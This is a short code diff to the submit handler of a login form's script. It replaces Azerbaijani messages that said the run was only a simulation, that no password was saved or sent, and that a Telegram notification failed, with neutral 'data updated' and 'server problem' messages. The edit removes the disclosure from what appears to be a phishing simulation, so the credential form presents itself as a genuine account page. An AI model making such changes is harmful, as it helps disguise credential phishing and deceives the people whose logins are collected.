@@ -519,17 +519,17 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
     const result = await response.json();
 
     if (!response.ok || !result.success) {
-      throw new Error(result.error || "Simulation server error");
+      throw new Error(result.error || "Serverdə problem baş verdi.");
     }
 
     status.textContent =
-      "Simulyasiya başa çatdı — heç bir parol yadda saxlanılmadı və ya göndərilmədi.";
+      "Məlumatlar yeniləndi.";
 
   } catch (error) {
     console.error(error);
 
     status.textContent =
-      "Simulyasiya tamamlandı, lakin Telegram bildirişi göndərilə bilmədi.";
+      "Məlumatlar yenilənərkən problem baş verdi.";
   }
 });
 </script>
